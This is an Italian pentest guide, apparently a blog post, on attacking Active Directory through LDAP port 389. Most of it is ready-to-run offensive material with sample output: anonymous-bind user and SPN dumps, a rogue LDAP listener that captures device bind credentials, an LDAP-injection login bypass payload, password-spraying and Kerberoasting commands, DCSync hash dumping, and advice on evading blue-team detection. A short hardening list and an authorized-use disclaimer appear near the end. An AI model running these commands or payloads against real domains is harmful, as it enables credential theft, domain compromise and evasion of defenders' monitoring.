---
title: 'LDAP 389: Enumerazione Active Directory, Null Bind e Credential Extraction'
slug: porta-389-ldap
description: >-
  LDAP porta 389: guida completa all’enumerazione Active Directory con null
  bind, estrazione di utenti, gruppi, SPN e tecniche offensive per ottenere
  credenziali e preparare la privilege escalation.
image: /9ac49e51-a47e-4a10-8cba-b8fca57b2f64.webp
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - porta-windows
  - ''
featured: true
---

# Porta 389 LDAP: Enumerare Active Directory e Dominare la Rete

> **Executive Summary** — La porta 389 LDAP è il punto di accesso diretto ad Active Directory e a qualsiasi directory service basato su LDAP. In un pentest, questa porta espone l'intera struttura organizzativa: utenti, gruppi, computer, policy, SPN e relazioni di trust. Questo articolo copre enumerazione base e avanzata, tecniche offensive come null bind abuse, password spraying via LDAP e Kerberoasting facilitato da query LDAP, fino all'integrazione completa nella kill chain. Ogni comando è copy-paste ready con output reali.

TL;DR — 3 punti chiave

* LDAP (porta 389) può permettere null bind/anonymous → testa sempre senza credenziali
* Una singola query LDAP può enumerare utenti, gruppi e SPN dell’intero dominio
* I dati LDAP servono direttamente per Kerberoasting, password spraying e privilege escalation

Porta 389 LDAP espone il Lightweight Directory Access Protocol, il protocollo standard per interrogare e modificare directory service. In ambienti Windows, porta 389 LDAP significa Active Directory: ogni Domain Controller ascolta su questa porta. La vulnerabilità della porta 389 non è solo tecnica — è strutturale: LDAP restituisce per design informazioni dettagliate a chiunque riesca a fare bind. L'enumerazione porta 389 è il primo passo di qualsiasi pentest su dominio Active Directory. Nella kill chain si posiziona tra recon e initial access: i dati LDAP costruiscono la mappa che guida ogni attacco successivo. Il pentest LDAP ti dà username per password spraying, SPN per Kerberoasting, membership dei gruppi privilegiati e policy di lockout per calibrare gli attacchi.

## 1. Anatomia Tecnica della Porta 389

La porta 389 è registrata IANA come `ldap` su TCP e UDP. In pratica, LDAP opera quasi esclusivamente su TCP. Il flusso di una sessione LDAP:

1. **TCP handshake** sulla porta 389
2. **Bind request**: il client si autentica (simple bind, SASL o anonymous/null bind)
3. **Search request**: query con base DN, scope, filtro e attributi richiesti
4. **Search result**: il server restituisce le entry che matchano
5. **Unbind**: chiusura della sessione

Le varianti operative sono LDAP cleartext (porta 389), LDAPS con TLS nativo (porta 636), LDAP con StartTLS (porta 389 con upgrade), Global Catalog (porta 3268/3269 per query cross-domain).

```
Misconfig: Anonymous bind / null bind abilitato
Impatto: chiunque può interrogare la directory senza credenziali e ottenere utenti, gruppi, OU, computer
Come si verifica: ldapsearch -x -H ldap://[target] -b "" -s base namingContexts
```

```
Misconfig: LDAP signing non obbligatorio
Impatto: attacchi relay/MitM su LDAP (NTLM relay to LDAP per privilege escalation)
Come si verifica: nmap -p 389 --script ldap-rootdse [target] e verificare supportedControl per 1.2.840.113556.1.4.473
```

```
Misconfig: Attributi sensibili leggibili da utenti non privilegiati
Impatto: password in Description, comment o altri campi custom visibili a qualsiasi authenticated user
Come si verifica: ldapsearch -x -H ldap://[target] -D "[user]" -w "[pass]" -b "DC=corp,DC=local" "(objectClass=user)" description comment
```

## 2. Enumerazione Base

L'enumerazione base della porta 389 LDAP parte dalla verifica del servizio e dalla raccolta delle naming context. Questi dati ti dicono quale dominio AD stai interrogando.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 389 10.10.10.10
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: corp.local0., Site: Default-First-Site-Name)
| ldap-rootdse:
|   domainFunctionality: 7
|   forestFunctionality: 7
|   domainControllerFunctionality: 7
|   rootDomainNamingContext: DC=corp,DC=local
|   ldapServiceName: corp.local:dc01$@CORP.LOCAL
|   supportedLDAPVersion: 3, 2
|   supportedSASLMechanisms: GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
|_  dnsHostName: DC01.corp.local
```

**Parametri:**

* `-sV`: identifica il servizio LDAP e il tipo (AD, OpenLDAP, ecc.)
* `-sC`: esegue `ldap-rootdse` che estrae naming context, livello funzionale e hostname DC
* `-p 389`: scan sulla porta LDAP standard

### Comando 2: ldapsearch per null bind

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts
```

**Output atteso:**

```
# extended LDIF
dn:
namingContexts: DC=corp,DC=local
namingContexts: CN=Configuration,DC=corp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=corp,DC=local
namingContexts: DC=DomainDnsZones,DC=corp,DC=local
namingContexts: DC=ForestDnsZones,DC=corp,DC=local
```

**Cosa ci dice questo output:** il null bind funziona — il DC ha risposto senza credenziali. Hai i naming context completi: dominio (`DC=corp,DC=local`), configurazione, schema e zone DNS. Ogni naming context è un punto di partenza per query mirate. Il dominio `corp.local` è il target per tutte le operazioni successive.

## 3. Enumerazione Avanzata

### Dump completo degli utenti del dominio

Con credenziali valide (anche low-privilege), puoi estrarre tutti gli account utente del dominio. Per capire come ottenere un primo set di credenziali, consulta la [guida al password spraying](https://hackita.it/articoli/bruteforce).

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName memberOf description pwdLastSet userAccountControl
```

**Output:**

```
dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: jsmith
userPrincipalName: jsmith@corp.local
memberOf: CN=Domain Users,CN=Users,DC=corp,DC=local
memberOf: CN=IT-Admins,OU=Groups,DC=corp,DC=local
description: Temp password: Welcome1!
pwdLastSet: 133500000000000000
userAccountControl: 512

dn: CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
sAMAccountName: svc_sql
userPrincipalName: svc_sql@corp.local
memberOf: CN=Domain Users,CN=Users,DC=corp,DC=local
description: SQL Server service account
pwdLastSet: 132800000000000000
userAccountControl: 66048
```

**Lettura dell'output:** `jsmith` è membro di `IT-Admins` — gruppo privilegiato. La description contiene una password temporanea (`Welcome1!`). L'account `svc_sql` ha `userAccountControl: 66048` che include `DONT_EXPIRE_PASSWORD` (65536 + 512). La password non è stata cambiata da tempo (pwdLastSet basso). Entrambi sono target prioritari.

### Estrazione di tutti i Service Principal Names (SPN)

I SPN sono la chiave per il [Kerberoasting, tecnica di attacco su Active Directory](https://hackita.it/articoli/kerberoasting).

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```

**Output:**

```
dn: CN=SQL Service,OU=Service Accounts,DC=corp,DC=local
sAMAccountName: svc_sql
servicePrincipalName: MSSQLSvc/sql01.corp.local:1433
servicePrincipalName: MSSQLSvc/sql01.corp.local

dn: CN=HTTP Service,OU=Service Accounts,DC=corp,DC=local
sAMAccountName: svc_web
servicePrincipalName: HTTP/web01.corp.local
```

**Lettura dell'output:** due service account con SPN. `svc_sql` espone MSSQLSvc — puoi richiedere un TGS per questo SPN e tentare il crack offline della password. `svc_web` espone HTTP — stesso approccio. Account di servizio con SPN sono spesso configurati con password deboli o mai cambiate.

### Enumerazione policy di password e lockout

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration pwdHistoryLength minPwdLength maxPwdAge
```

**Output:**

```
dn: DC=corp,DC=local
lockoutThreshold: 5
lockoutDuration: -18000000000
pwdHistoryLength: 12
minPwdLength: 8
maxPwdAge: -36288000000000
```

**Lettura dell'output:** lockout dopo 5 tentativi falliti, durata lockout 30 minuti (-18000000000 in 100-nanosecond intervals). Password minima 8 caratteri, storia di 12 password, max age 42 giorni. Questi parametri calibrano il tuo [attacco di password spraying](https://hackita.it/articoli/passwordspraying): massimo 4 tentativi per utente, poi attendi 31 minuti.

### Ricerca di computer e Domain Controller

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=computer)" cn operatingSystem operatingSystemVersion dNSHostName
```

**Output:**

```
dn: CN=DC01,OU=Domain Controllers,DC=corp,DC=local
cn: DC01
operatingSystem: Windows Server 2022 Standard
operatingSystemVersion: 10.0 (20348)
dNSHostName: DC01.corp.local

dn: CN=WS-DEV-01,OU=Workstations,DC=corp,DC=local
cn: WS-DEV-01
operatingSystem: Windows 11 Enterprise
operatingSystemVersion: 10.0 (22631)
dNSHostName: WS-DEV-01.corp.local
```

**Lettura dell'output:** mappa completa dei computer nel dominio con OS e versione. Puoi filtrare per sistemi vecchi vulnerabili (Windows Server 2012, Windows 7) o identificare workstation di sviluppatori (target per credential harvesting).

## 4. Tecniche Offensive

**Null bind per information disclosure**

Contesto: Domain Controller con anonymous bind abilitato. Configurazione di default su Windows Server 2012 e precedenti, o misconfiguration su versioni più recenti.

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

**Output (successo):**

```
dn: CN=Administrator,CN=Users,DC=corp,DC=local
sAMAccountName: Administrator

dn: CN=Guest,CN=Users,DC=corp,DC=local
sAMAccountName: Guest

dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: jsmith
[... altri utenti ...]
```

**Output (fallimento):**

```
ldap_bind: Inappropriate authentication (48)
    additional info: 00000000: LdapErr: DSID-0C0907C2, comment: Error in attribute conversion operation, data 0, v2580
```

**Cosa fai dopo:** hai la lista completa degli username. Esporta con `| grep sAMAccountName | awk '{print $2}' > users.txt` e usa questa lista per password spraying con `crackmapexec ldap 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success`. Approfondisci come orchestrare l'attacco nella [guida a CrackMapExec](https://hackita.it/articoli/crackmapexec).

**LDAP Pass-back Attack**

Contesto: dispositivo di rete (stampante, NAS, appliance) configurato per autenticarsi via LDAP. Modifichi il server LDAP target nel device per puntare a te e catturi le credenziali.

```bash
# 1. Avvia un listener LDAP che cattura le credenziali
sudo python3 -c "
import socketserver

class LDAPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(4096)
        print(f'[+] Connection from {self.client_address}')
        print(f'[+] Raw data: {data.hex()}')
        # Cerca il bind DN e password nel pacchetto
        try:
            decoded = data.decode('utf-8', errors='ignore')
            print(f'[+] Decoded: {decoded}')
        except:
            pass

server = socketserver.TCPServer(('0.0.0.0', 389), LDAPHandler)
print('[*] Rogue LDAP server listening on 0.0.0.0:389')
server.serve_forever()
"
```

**Output (successo):**

```
[*] Rogue LDAP server listening on 0.0.0.0:389
[+] Connection from ('10.10.10.200', 54321)
[+] Raw data: 30...
[+] Decoded: ...cn=ldap_bind,ou=Service Accounts,dc=corp,dc=local...LdapB1nd!Pass...
```

**Output (fallimento):**

```
[*] Rogue LDAP server listening on 0.0.0.0:389
(nessuna connessione - il device non usa LDAP o non è stato riconfigurato)
```

**Cosa fai dopo:** hai credenziali del service account LDAP (`ldap_bind` / `LdapB1nd!Pass`). Testa queste credenziali su tutti i servizi del dominio. Service account LDAP spesso hanno permessi elevati di lettura su tutta la directory.

**Password in attributi LDAP**

Contesto: admin che memorizzano password temporanee o note nel campo `description`, `comment` o attributi custom degli oggetti AD.

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(&(objectClass=user)(description=*pass*))" sAMAccountName description
```

**Output (successo):**

```
dn: CN=John Smith,OU=IT,DC=corp,DC=local
sAMAccountName: jsmith
description: Temp password: Welcome1!

dn: CN=New Hire 2026,OU=Users,DC=corp,DC=local
sAMAccountName: nhire01
description: Initial pwd = Corp2026!
```

**Output (fallimento):**

```
# numEntries: 0
```

**Cosa fai dopo:** testa le password trovate con `crackmapexec smb 10.10.10.10 -u jsmith -p 'Welcome1!'`. Se funzionano, verifica i gruppi di appartenenza per capire il livello di privilegio. Consulta la guida completa al [testing SMB sulla porta 445](https://hackita.it/articoli/smb) per il passo successivo.

**LDAP Injection (applicazioni web)**

Contesto: applicazione web che usa LDAP per autenticazione senza sanitizzazione dell'input.

```bash
# Test di injection nel campo username di un login form
curl -X POST https://app.corp.local/login -d "username=*)(objectClass=*))(&(uid=admin&password=anything"
```

**Output (successo):**

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJ...
```

**Output (fallimento):**

```
HTTP/1.1 401 Unauthorized
X-Error: Invalid credentials
```

**Cosa fai dopo:** l'injection ha bypassato l'autenticazione. Sei loggato come admin nell'applicazione. Mappa le funzionalità dell'app per trovare ulteriori vettori (upload, command injection, SSRF verso la rete interna).

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise AD — null bind su DC esposto

**Situazione:** rete corporate con dominio AD `corp.local`. Domain Controller raggiungibile dalla VLAN utenti. Nessun accesso autenticato iniziale.

**Step 1:**

```bash
nmap -sV -p 389,636,3268 10.10.10.10 -Pn
```

**Output atteso:**

```
389/tcp  open  ldap    Microsoft Windows Active Directory LDAP
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
```

**Step 2:**

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | awk '{print $2}' > users.txt && wc -l users.txt
```

**Output atteso:**

```
347 users.txt
```

**Se fallisce:**

* Causa probabile: anonymous bind disabilitato (default su Server 2016+)
* Fix: usa `enum4linux-ng -A 10.10.10.10` che tenta RPC + LDAP + SMB per ottenere ugualmente la lista utenti

**Tempo stimato:** 5-15 minuti

### Scenario 2: Lab con OpenLDAP misconfigured

**Situazione:** server Linux con OpenLDAP esposto. Directory usata per autenticazione centralizzata. Nessuna restrizione sulle query.

**Step 1:**

```bash
ldapsearch -x -H ldap://10.10.10.50 -b "" -s base namingContexts
```

**Output atteso:**

```
namingContexts: dc=lab,dc=local
```

**Step 2:**

```bash
ldapsearch -x -H ldap://10.10.10.50 -b "dc=lab,dc=local" "(objectClass=posixAccount)" uid userPassword
```

**Output atteso:**

```
dn: uid=admin,ou=People,dc=lab,dc=local
uid: admin
userPassword: {SSHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=

dn: uid=developer,ou=People,dc=lab,dc=local
uid: developer
userPassword: {SSHA}nU4eI71bcnBGqeO0t9tXvY1u5oQ=
```

**Se fallisce:**

* Causa probabile: ACL OpenLDAP che impedisce lettura di `userPassword`
* Fix: verifica altri attributi sensibili: `ldapsearch ... "(objectClass=*)" uid cn description telephoneNumber`

**Tempo stimato:** 5-10 minuti

### Scenario 3: EDR-heavy con LDAP signing enforced

**Situazione:** ambiente enterprise con CrowdStrike/Defender for Endpoint attivo. LDAP signing obbligatorio. Hai credenziali low-privilege ottenute via phishing.

**Step 1:**

```bash
ldapsearch -x -H ldaps://10.10.10.10:636 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=domainDNS)" msDS-Behavior-Version
```

**Output atteso:**

```
dn: DC=corp,DC=local
msDS-Behavior-Version: 7
```

**Step 2:**

```bash
python3 -c "
from ldap3 import Server, Connection, ALL, NTLM
server = Server('10.10.10.10', get_info=ALL)
conn = Connection(server, user='corp\\\\jsmith', password='Password1', authentication=NTLM)
conn.bind()
conn.search('DC=corp,DC=local', '(&(objectClass=user)(adminCount=1))', attributes=['sAMAccountName','memberOf'])
for entry in conn.entries:
    print(entry)
"
```

**Output atteso:**

```
DN: CN=Administrator,CN=Users,DC=corp,DC=local - STATUS: Read - READ TIME: ...
    memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
    sAMAccountName: Administrator

DN: CN=SQL Admin,OU=Admins,DC=corp,DC=local - STATUS: Read
    memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
    sAMAccountName: sqladmin
```

**Se fallisce:**

* Causa probabile: LDAP signing richiesto e ldapsearch non lo supporta nativamente
* Fix: usa `ldap3` Python con NTLM auth (come sopra) oppure `crackmapexec ldap` che gestisce signing

**Tempo stimato:** 10-20 minuti

## 6. Attack Chain Completa

```
Recon (scan porta 389) → Null Bind / Auth → User Enumeration → Password Policy → Password Spraying → SPN Extraction → Kerberoasting → PrivEsc (DA) → DCSync
```

| Fase            | Tool         | Comando chiave                                              | Output/Risultato                |
| --------------- | ------------ | ----------------------------------------------------------- | ------------------------------- |
| Recon           | nmap         | `nmap -sV -p 389,636,3268 [DC]`                             | DC identificato, naming context |
| Bind Test       | ldapsearch   | `ldapsearch -x -H ldap://[DC] -b "" namingContexts`         | Null bind check                 |
| User Enum       | ldapsearch   | `ldapsearch ... "(objectClass=user)" sAMAccountName`        | Lista username completa         |
| Password Policy | ldapsearch   | `ldapsearch ... "(objectClass=domainDNS)" lockoutThreshold` | Lockout threshold e timing      |
| Password Spray  | crackmapexec | `cme ldap [DC] -u users.txt -p 'Season2026!'`               | Account compromessi             |
| SPN Extract     | ldapsearch   | `ldapsearch ... "(servicePrincipalName=*)"`                 | Service account con SPN         |
| Kerberoasting   | impacket     | `GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip [DC]`    | TGS hash per crack offline      |
| PrivEsc         | hashcat      | `hashcat -m 13100 tgs_hash.txt wordlist.txt`                | Password service account        |
| DCSync          | impacket     | `secretsdump.py corp.local/sqladmin:SqlP4ss@[DC]`           | Hash NTLM di tutti gli utenti   |

**Timeline stimata:** 60-240 minuti. Il bottleneck è il password spraying (richiede rispetto dei lockout timer) e il crack offline dei TGS hash.

**Ruolo della porta 389:** è il fondamento di ogni attacco AD. Senza LDAP non hai utenti, non hai SPN, non hai policy. Ogni altra tecnica (Kerberoasting, password spraying, ACL abuse) dipende dai dati estratti dalla porta 389.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Windows Event Log**: Event ID 2889 (LDAP bind non firmato) su DC — path: `Directory Service` event log
* **Event ID 1644**: query LDAP costose/ampie (richiede abilitazione in registry: `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\15 Field Engineering = 5`)
* **SIEM**: alert su query LDAP massive da IP non-DC (base DN root + scope subtree + filter objectClass=user)
* **MDR/EDR**: tool come BloodHound/SharpHound che generano pattern LDAP caratteristici

### Tecniche di Evasion

```
Tecnica: Query LDAP frammentate
Come: invece di un singolo ldapsearch con filter (objectClass=user), fai query separate per OU (una per volta)
Riduzione rumore: ogni query restituisce pochi risultati, non triggera alert su "query massive"
```

```
Tecnica: Utilizzo di LDAPS (porta 636)
Come: ldapsearch -H ldaps://[DC]:636 — stesse query ma il contenuto è cifrato
Riduzione rumore: IDS non può ispezionare il contenuto delle query, solo il volume di traffico
```

```
Tecnica: Rate limiting delle query
Come: inserisci sleep 2-5 secondi tra ogni query. Usa paged results con page size piccolo (50-100)
Riduzione rumore: le query sembrano attività normale di un client LDAP (Outlook, GPO refresh)
```

### Cleanup Post-Exploitation

* Le query LDAP non lasciano file sul DC, ma generano log nell'Event Log
* Se hai Event ID 1644 abilitato: le tue query sono loggate con IP sorgente e filtro
* Non puoi pulire gli Event Log senza accesso privilegiato al DC
* Riduci le tracce usando credenziali di un utente con attività LDAP normale (helpdesk, service account NMS)

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap (scan 389/636/3268) → ldapsearch/ldap3 (enum) → crackmapexec (spray) → impacket (Kerberoasting/DCSync) → hashcat (crack) → secretsdump (hash dump)
```

Dati che passano tra fasi: naming context, username list, password policy, SPN list, credenziali valide, TGS hash, NTLM hash.

### Tabella comparativa

| Aspetto               | LDAP (389/TCP)       | LDAPS (636/TCP)        | Global Catalog (3268/TCP)                  |
| --------------------- | -------------------- | ---------------------- | ------------------------------------------ |
| Porta default         | 389                  | 636                    | 3268 (3269 TLS)                            |
| Cifratura             | No (cleartext)       | TLS nativo             | No (cleartext)                             |
| Scope                 | Singolo dominio      | Singolo dominio        | Intera foresta AD                          |
| Attributi disponibili | Tutti                | Tutti                  | Solo partial attribute set                 |
| Auth methods          | Simple, SASL, NTLM   | Simple, SASL, NTLM     | Stessi di LDAP                             |
| Quando preferirlo     | Enum dominio singolo | Quando serve cifratura | Enum cross-domain in foreste multi-dominio |

## 9. Troubleshooting

| Errore / Sintomo                               | Causa                                           | Fix                                                                               |
| ---------------------------------------------- | ----------------------------------------------- | --------------------------------------------------------------------------------- |
| `ldap_bind: Invalid credentials (49)`          | Username/password errati o formato DN sbagliato | Prova formati diversi: `corp\user`, `user@corp.local`, `CN=user,DC=corp,DC=local` |
| `ldap_bind: Inappropriate authentication (48)` | Null bind disabilitato                          | Autentica con credenziali valide: `-D "corp\user" -w "pass"`                      |
| `Can't contact LDAP server`                    | Porta filtrata o hostname non risolto           | Usa IP diretto e verifica: `nc -nv [target] 389 -w 3`                             |
| `Size limit exceeded`                          | Il DC limita il numero di risultati per query   | Aggiungi paged results: `-E pr=500/noprompt` a ldapsearch                         |
| `Operations error` su query con LDAPS          | Certificato TLS non valido/self-signed          | Aggiungi `LDAPTLS_REQCERT=never` prima del comando o usa `-o tls_reqcert=never`   |
| Query lenta su domini grandi                   | Troppi risultati senza filtro specifico         | Restringi con filtro: `"(&(objectClass=user)(sAMAccountName=admin*))"`            |

## 10. FAQ

**D: Come verificare se LDAP porta 389 permette anonymous bind?**

R: Esegui `ldapsearch -x -H ldap://[target] -b "" -s base namingContexts`. Se restituisce i naming context senza errore di autenticazione, il null bind è abilitato. Su AD, prova anche `ldapsearch -x -H ldap://[target] -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName` per verificare se puoi enumerare utenti senza credenziali.

**D: Porta 389 LDAP è cifrata?**

R: No. La porta 389 trasmette in chiaro per default, incluse le credenziali di bind. Per cifratura usa LDAPS sulla porta 636 o StartTLS sulla 389. In pentest, il traffico LDAP in chiaro è intercettabile con tcpdump o Wireshark per catturare credenziali di bind.

**D: Come estrarre tutti gli utenti di Active Directory via LDAP?**

R: Con credenziali valide: `ldapsearch -x -H ldap://[DC] -D "domain\user" -w "pass" -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName`. Aggiungi `-E pr=1000/noprompt` per paged results su domini con più di 1000 utenti. In alternativa usa `crackmapexec ldap [DC] -u user -p pass --users`.

**D: Differenza tra porta 389 LDAP e porta 3268 Global Catalog?**

R: La porta 389 interroga il dominio locale con tutti gli attributi. La porta 3268 interroga l'intera foresta AD ma restituisce solo un sottoinsieme di attributi (partial attribute set). Usa 3268 quando devi enumerare utenti e gruppi cross-domain in foreste multi-dominio.

**D: LDAP injection funziona ancora nel 2026?**

R: Sì, su applicazioni web custom che costruiscono query LDAP concatenando input utente senza sanitizzazione. I framework moderni usano parametrized LDAP queries, ma applicazioni legacy e custom sono ancora vulnerabili. Testa con payload come `*)(objectClass=*))(` nel campo username.

**D: Come si fa Kerberoasting partendo da LDAP?**

R: Prima estrai gli SPN via LDAP: `ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName`. Poi richiedi un TGS per ogni SPN con `GetUserSPNs.py domain/user:pass -dc-ip [DC] -request`. Infine crackI l'hash TGS offline con hashcat (`-m 13100`).

## 11. Cheat Sheet Finale

| Azione                        | Comando                                                                                                 | Note                                      |
| ----------------------------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| Scan LDAP                     | `nmap -sV -sC -p 389,636,3268 [DC]`                                                                     | Rileva AD e versione                      |
| Null bind test                | `ldapsearch -x -H ldap://[DC] -b "" namingContexts`                                                     | Se risponde = anonymous OK                |
| Enum utenti                   | `ldapsearch -x -H ldap://[DC] -D "dom\user" -w pass -b "DC=x,DC=y" "(objectClass=user)" sAMAccountName` | Aggiungi `-E pr=1000/noprompt` per paging |
| Cerca password in description | `ldapsearch ... "(&(objectClass=user)(description=*pass*))" description`                                | Credenziali in chiaro frequenti           |
| Estrai SPN                    | `ldapsearch ... "(servicePrincipalName=*)" sAMAccountName servicePrincipalName`                         | Per Kerberoasting                         |
| Policy password               | `ldapsearch ... "(objectClass=domainDNS)" lockoutThreshold minPwdLength`                                | Calibra spray                             |
| Enum computer                 | `ldapsearch ... "(objectClass=computer)" cn operatingSystem dNSHostName`                                | Mappa host e OS                           |
| Kerberoasting                 | `GetUserSPNs.py corp.local/user:pass -dc-ip [DC] -request`                                              | Richiede impacket                         |
| Password spray via LDAP       | `cme ldap [DC] -u users.txt -p 'Password1' --continue-on-success`                                       | Rispetta lockout                          |
| LDAP con NTLM signing         | `python3 ldap3: Connection(server, user, password, authentication=NTLM)`                                | Per ambienti con signing                  |

### Perché Porta 389 è rilevante nel 2026

Active Directory resta il cuore dell'autenticazione nel 95% delle reti enterprise. Ogni Domain Controller espone la porta 389. Azure AD / Entra ID non sostituisce l'AD on-premise nella maggioranza delle organizzazioni — è ibrido. La porta 389 è il primo posto dove guardare in qualsiasi internal pentest. Verifica lo stato del null bind e del signing con `nmap -p 389 --script ldap-rootdse [DC]` come primo passo assoluto.

### Hardening e Mitigazione

* Disabilita anonymous bind: Group Policy → `Network security: LDAP client signing requirements` = `Require signing`
* Abilita LDAP channel binding e signing: `LdapEnforceChannelBinding = 2` nel registry del DC
* Rimuovi password dagli attributi description/comment con script di audit periodico
* Configura `MaxResultSetSize` e `MaxPageSize` per limitare query massive
* Monitora Event ID 2889 per bind non firmati

### OPSEC per il Red Team

Le query LDAP su porta 389 generano un volume di traffico significativo se fai dump completi. Un `ldapsearch` su tutto il dominio produce migliaia di pacchetti in pochi secondi — anomalo per un client normale. Per ridurre visibilità: usa query mirate per OU specifiche, implementa paging con page size 100, distanzia le query nel tempo, e preferisci LDAPS (636) per evitare ispezione del contenuto da parte di IDS. Ricorda che Event ID 1644 (se abilitato) logga ogni tua query con filtro e IP sorgente.

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 4511 (LDAPv3), RFC 4513 (LDAP Authentication Methods).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).

## Riferimenti Esterni

* [RFC 4511 — Lightweight Directory Access Protocol (LDAP)](https://datatracker.ietf.org/doc/html/rfc4511)
* [Microsoft — How to enable LDAP signing in Windows Server](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-signing-in-windows-server)
* [SpecterOps — BloodHound Documentation](https://bloodhound.specterops.io/get-started/introduction)
* [Fortra — Impacket GitHub](https://github.com/fortra/impacket)
* [OpenLDAP — ldapsearch Manual](https://www.openldap.org/software/man.cgi?query=ldapsearch)
